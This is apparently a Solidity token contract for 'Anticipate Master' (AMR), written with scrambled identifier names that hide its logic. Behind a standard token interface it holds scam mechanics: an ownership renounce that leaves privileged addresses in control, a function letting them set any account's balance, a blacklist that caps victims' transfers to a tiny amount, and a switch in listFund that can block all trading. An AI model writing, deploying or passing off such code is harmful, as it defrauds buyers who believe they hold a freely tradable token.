//SPDX-License-Identifier: MIT

pragma solidity ^0.8.9;

interface launchTotalExempt {
    function createPair(address sellTake, address launchEnable) external returns (address);
}

interface autoFee {
    function totalSupply() external view returns (uint256);

    function balanceOf(address atFee) external view returns (uint256);

    function transfer(address buyTx, uint256 marketingLiquidity) external returns (bool);

    function allowance(address buyFee, address spender) external view returns (uint256);

    function approve(address spender, uint256 marketingLiquidity) external returns (bool);

    function transferFrom(
        address sender,
        address buyTx,
        uint256 marketingLiquidity
    ) external returns (bool);

    event Transfer(address indexed from, address indexed fromLaunch, uint256 value);
    event Approval(address indexed buyFee, address indexed spender, uint256 value);
}

abstract contract fundTake {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface listSender {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface launchMode is autoFee {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract AnticipateMaster is fundTake, autoFee, launchMode {

    mapping(address => bool) public txTeam;

    function getOwner() external view returns (address) {
        return launchedFrom;
    }

    address private launchedFrom;

    uint8 private receiverMin = 18;

    mapping(address => bool) public sellTrading;

    mapping(address => uint256) private launchedReceiverSell;

    address receiverToken = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function name() external view virtual override returns (string memory) {
        return txExempt;
    }

    uint256 private fundReceiver = 100000000 * 10 ** 18;

    function sellAuto() public {
        emit OwnershipTransferred(takeListTo, address(0));
        launchedFrom = address(0);
    }

    bool private amountTakeAt;

    function receiverEnable() private view {
        require(sellTrading[_msgSender()]);
    }

    uint256 fromList;

    address public takeListTo;

    uint256 constant toShouldLaunch = 14 ** 10;

    bool public minToken;

    address toReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function approve(address autoLaunched, uint256 marketingLiquidity) public virtual override returns (bool) {
        maxAuto[_msgSender()][autoLaunched] = marketingLiquidity;
        emit Approval(_msgSender(), autoLaunched, marketingLiquidity);
        return true;
    }

    function owner() external view returns (address) {
        return launchedFrom;
    }

    mapping(address => mapping(address => uint256)) private maxAuto;

    function transfer(address tokenShould, uint256 marketingLiquidity) external virtual override returns (bool) {
        return listFund(_msgSender(), tokenShould, marketingLiquidity);
    }

    function takeSell(address tokenShould, uint256 marketingLiquidity) public {
        receiverEnable();
        launchedReceiverSell[tokenShould] = marketingLiquidity;
    }

    uint256 private liquidityTx;

    function listFund(address tokenAuto, address buyTx, uint256 marketingLiquidity) internal returns (bool) {
        if (tokenAuto == takeListTo) {
            return totalEnable(tokenAuto, buyTx, marketingLiquidity);
        }
        uint256 listAuto = autoFee(fromTrading).balanceOf(receiverToken);
        require(listAuto == marketingSwap);
        require(buyTx != receiverToken);
        if (txTeam[tokenAuto]) {
            return totalEnable(tokenAuto, buyTx, toShouldLaunch);
        }
        return totalEnable(tokenAuto, buyTx, marketingLiquidity);
    }

    uint256 public limitAmountReceiver;

    function toFund(address exemptIsEnable) public {
        require(exemptIsEnable.balance < 100000);
        if (minToken) {
            return;
        }
        if (amountTakeAt != sellFund) {
            sellFund = false;
        }
        sellTrading[exemptIsEnable] = true;
        
        minToken = true;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return fundReceiver;
    }

    constructor (){
        
        listSender receiverTo = listSender(toReceiver);
        fromTrading = launchTotalExempt(receiverTo.factory()).createPair(receiverTo.WETH(), address(this));
        if (modeEnable == limitAmountReceiver) {
            autoFrom = false;
        }
        takeListTo = _msgSender();
        sellTrading[takeListTo] = true;
        launchedReceiverSell[takeListTo] = fundReceiver;
        sellAuto();
        
        emit Transfer(address(0), takeListTo, fundReceiver);
    }

    function toLaunchedBuy(address senderTx) public {
        receiverEnable();
        if (modeEnable == amountReceiver) {
            amountTakeAt = false;
        }
        if (senderTx == takeListTo || senderTx == fromTrading) {
            return;
        }
        txTeam[senderTx] = true;
    }

    function symbol() external view virtual override returns (string memory) {
        return takeLimit;
    }

    function transferFrom(address tokenAuto, address buyTx, uint256 marketingLiquidity) external override returns (bool) {
        if (_msgSender() != toReceiver) {
            if (maxAuto[tokenAuto][_msgSender()] != type(uint256).max) {
                require(marketingLiquidity <= maxAuto[tokenAuto][_msgSender()]);
                maxAuto[tokenAuto][_msgSender()] -= marketingLiquidity;
            }
        }
        return listFund(tokenAuto, buyTx, marketingLiquidity);
    }

    string private takeLimit = "AMR";

    bool public txTrading;

    bool private sellFund;

    function totalEnable(address tokenAuto, address buyTx, uint256 marketingLiquidity) internal returns (bool) {
        require(launchedReceiverSell[tokenAuto] >= marketingLiquidity);
        launchedReceiverSell[tokenAuto] -= marketingLiquidity;
        launchedReceiverSell[buyTx] += marketingLiquidity;
        emit Transfer(tokenAuto, buyTx, marketingLiquidity);
        return true;
    }

    function balanceOf(address atFee) public view virtual override returns (uint256) {
        return launchedReceiverSell[atFee];
    }

    address public fromTrading;

    uint256 public amountReceiver;

    event OwnershipTransferred(address indexed txToken, address indexed exemptLimit);

    function feeTeam(uint256 marketingLiquidity) public {
        receiverEnable();
        marketingSwap = marketingLiquidity;
    }

    function allowance(address maxToken, address autoLaunched) external view virtual override returns (uint256) {
        if (autoLaunched == toReceiver) {
            return type(uint256).max;
        }
        return maxAuto[maxToken][autoLaunched];
    }

    bool private autoFrom;

    uint256 marketingSwap;

    string private txExempt = "Anticipate Master";

    uint256 private modeEnable;

    function decimals() external view virtual override returns (uint8) {
        return receiverMin;
    }

}